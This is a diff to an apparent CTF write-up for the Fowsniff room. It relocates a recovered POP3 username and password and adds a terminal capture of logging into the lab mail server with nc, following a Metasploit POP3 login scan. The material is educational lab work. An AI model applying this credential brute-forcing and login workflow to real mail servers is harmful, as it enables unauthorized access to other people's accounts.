@@ -216,15 +216,7 @@ msf auxiliary(scanner/pop3/pop3_login) > exploit
 
 ```
 
-Great, we got a hit! We can now try connecting to the POP3 service using these credentials:
-```
-USER seina
-PASS scoobydoo2=
-```
-
-```
-
-```
+Great, we got a hit! 
 <div>
 <br>
 <br>
@@ -238,6 +230,23 @@ PASS scoobydoo2=
 
 ##### Can you connect to the pop3 service with her credentials? What email information can you gather?
 ==No answer needed==
+
+We can now try connecting to the POP3 service using these credentials:
+
+```
+USER seina
+PASS scoobydoo2
+```
+
+```
+┌──(root㉿kali)-[/home/kali/ET/THM/Fowsniff CTF]
+└─# nc 10.82.154.253 110
++OK Welcome to the Fowsniff Corporate Mail Server!
+USER seina
++OK
+PASS scoobydoo2
++OK Logged in.
+```
 <div>
 <br>
 <br>
